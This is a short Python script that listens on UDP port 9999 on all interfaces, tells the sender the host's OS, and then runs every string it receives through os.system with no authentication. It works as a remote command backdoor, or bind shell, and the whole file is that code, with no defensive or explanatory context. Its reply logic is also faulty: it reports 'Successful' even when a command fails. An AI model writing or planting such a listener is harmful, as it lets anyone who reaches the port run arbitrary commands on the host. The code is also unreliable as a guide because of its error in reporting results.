import socket,time,os,sys,subprocess
# UDP socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# myaddress without network connection
myaddress = ("0.0.0.0", 9999)  # (ip,port)
try:
    s.bind(myaddress) # bind socket to myaddress    
    # target OS type
    target_os = sys.platform
    data = s.recvfrom(25) # wait for target system to send its OS name
    print(data) # print received data
    s.sendto(target_os.encode('ascii'), data[1])
    while True:
        cltdata=s.recvfrom(100)
        #validate received data
        cmd =(cltdata[0].decode('ascii'))
        check=os.system(cmd)
        if check == 0:
            print("Successful")
            s.sendto("Successful".encode('ascii'), cltdata[1])
        else:
            print("Failed") 
            s.sendto("Successful".encode('ascii'), cltdata[1])

except :
    print("Error: unable to start socket")
    time.sleep(1)
    print("ok check your port number ")


